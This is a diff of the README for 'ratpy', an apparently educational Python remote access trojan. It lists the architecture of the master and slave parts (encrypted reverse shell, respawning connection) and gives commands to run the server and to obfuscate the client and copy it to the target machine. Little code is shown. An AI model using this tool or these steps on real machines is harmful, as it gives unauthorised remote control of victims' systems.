@@ -1,8 +1,10 @@
 # ratpy
-#### another snake friendly rat - simple backdoor without tools
+### another snake friendly rat - simple backdoor without tools
+### _________________________________________________________________________
 <p align="left">
 <img src="imgs/ratpy.png" width="240" height="160">
 </p>
+### _________________________________________________________________________
 
 ## Architecture
 ````
@@ -22,19 +24,23 @@ provide a prototype to build something more interesting in a different language,
 tested and educational purposes
 ````
 ### _________________________________________________________________________
+````
 ### Master
 * interface - server menu and server cli scripting
 * threadpool - running paralel code to serve menu while waiting and handling connections set to up to 20 by default
 * tools - backdoor :: encrypted reverse shell 30s RAT connection with respawn and client-side
 * utils - encryption methods and connection methods
 > cd master && python3 main.py <server_ip_addr> <rat_port> <shell_port>
+````
 ### _________________________________________________________________________
+````
 ### Slave
 * interface - client cli scripting
 * tools - RAT client backdoor
 * utils - encryption methods and connection methods
 > server :: python3 obfuscator.py && <copy ratpy.py to slave machine>
 > python3 ratpy.py <server_ip_addr> <rat_port>
+````
 ### _________________________________________________________________________
 
 ## Adding extensions
